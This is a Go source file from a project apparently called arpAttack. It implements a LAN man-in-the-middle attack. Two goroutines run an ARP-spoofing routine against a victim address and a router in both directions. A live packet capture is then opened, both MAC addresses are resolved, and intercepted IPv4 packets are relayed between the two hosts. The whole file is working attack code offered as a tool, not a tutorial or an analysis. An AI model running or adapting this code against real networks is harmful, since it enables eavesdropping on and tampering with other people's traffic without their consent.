package mitm

import (
	"errors"
	"fmt"
	"net"

	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/rogercoll/arpAttack/internal/pkg/utils"
	"github.com/rogercoll/arpAttack/pkg/dos"
)

//channel de lectura
func performMITM(handler *pcap.Handle, iface *net.Interface, dstAddr, routerAddr string, dstMAC, routerMAC []byte, stop <-chan error) error {
	ipv4Packets := make(chan layers.IPv4)
	defer close(ipv4Packets)
	stopReading := make(chan struct{})
	go utils.ReadIPv4(handler, iface, ipv4Packets, stopReading)
	defer close(stopReading)
	for {
		select {
		case err := <-stop:
			return err
		case ipv4Packet := <-ipv4Packets:
			if ipv4Packet.DstIP.String() == dstAddr {
				err := utils.WriteIPv4(ipv4Packet, handler, iface, dstMAC)
				if err != nil {
					return err
				}
			} else if ipv4Packet.DstIP.String() == routerAddr {
				err := utils.WriteIPv4(ipv4Packet, handler, iface, routerMAC)
				if err != nil {
					return err
				}
			} else {
				return errors.New("Any address MAC match")
			}
		}
	}
}

//routerAddr can be any host in the LAN
func Run(ifaceName string, dstAddr, routerAddr string) error {
	done := make(chan error)
	defer close(done)
	go func() {
		err := dos.Run(ifaceName, dstAddr, routerAddr)
		if err != nil {
			done <- fmt.Errorf("VictimAddr: %v\n", err)
		}
	}()

	go func() {
		err := dos.Run(ifaceName, routerAddr, dstAddr)
		if err != nil {
			done <- fmt.Errorf("RouterAddr: %v\n", err)
		}
	}()

	select {
	case err := <-done:
		return err
	default:
		iface, err := utils.GetInterface(ifaceName)
		if err != nil {
			return err
		}
		handler, err := pcap.OpenLive(iface.Name, 65536, true, pcap.BlockForever)
		if err != nil {
			return err
		}
		addr, err := utils.GetValidAddress(iface)
		if err != nil {
			return err
		}
		dstMAC, err := utils.GetDstMACAddr(iface, handler, addr, dstAddr)
		if err != nil {
			return fmt.Errorf("DstAddr: %v\n", err)
		}
		routerMAC, err := utils.GetDstMACAddr(iface, handler, addr, routerAddr)
		if err != nil {
			return fmt.Errorf("RouterAddr: %v\n", err)
		}
		err = performMITM(handler, iface, dstAddr, routerAddr, dstMAC, routerMAC, done)
		if err != nil {
			return err
		}
	}

	return nil
}
